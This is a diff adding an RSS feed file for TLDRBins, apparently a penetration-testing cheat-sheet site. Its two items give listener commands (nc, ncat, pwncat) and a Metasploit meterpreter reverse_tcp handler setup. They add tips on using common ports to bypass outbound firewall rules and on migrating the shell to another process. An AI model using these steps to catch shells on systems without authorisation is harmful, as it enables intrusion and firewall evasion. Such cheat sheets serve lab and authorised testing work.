@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Listener on TLDRBins</title>
+    <link>https://tldrbins.github.io/@listener/</link>
+    <description>Recent content in Listener on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@listener/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Listeners</title>
+      <link>https://tldrbins.github.io/listeners/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/listeners/</guid>
+      <description> nc rlwrap nc -lvnp 1337 ncat # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back </description>
+    </item>
+    <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+  </channel>
+</rss>
